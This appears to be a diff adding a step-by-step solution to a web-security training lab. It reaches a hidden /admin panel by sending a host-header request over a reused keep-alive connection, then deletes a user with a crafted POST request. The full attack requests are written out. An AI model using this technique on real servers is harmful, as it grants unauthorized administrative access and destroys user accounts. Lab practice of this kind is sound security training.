@@ -1,0 +1,38 @@
+Steps:
+
+1. Send the GET / request to Burp Repeater.
+
+2. Modify the request:
+    GET /admin HTTP/1.1
+    Host: 192.168.0.1
+
+3. Send the request and observe that you are redirected to the homepage.
+
+4. Duplicate the Repeater tab and add both tabs to a new group.
+
+5. In the first tab, restore the request to:
+    GET / HTTP/1.1
+    Host: YOUR-LAB-ID.web-security-academy.net
+
+6. Set the send mode to:
+    Send group in sequence (single connection)
+
+7. Change the Connection header to:
+    Connection: keep-alive
+
+8. Send the sequence and inspect both responses. Confirm that the second request successfully accesses:
+    /admin
+
+9. In the second tab, craft the delete request:
+
+    POST /admin/delete HTTP/1.1
+    Host: 192.168.0.1
+    Cookie: _lab=<LAB-COOKIE>; session=<SESSION-COOKIE>
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: <CORRECT-LENGTH>
+
+    csrf=<CSRF-TOKEN>&username=carlos
+
+10. Send the requests in sequence over a single connection.
+
+11. The request to /admin/delete deletes carlos and solves the lab.
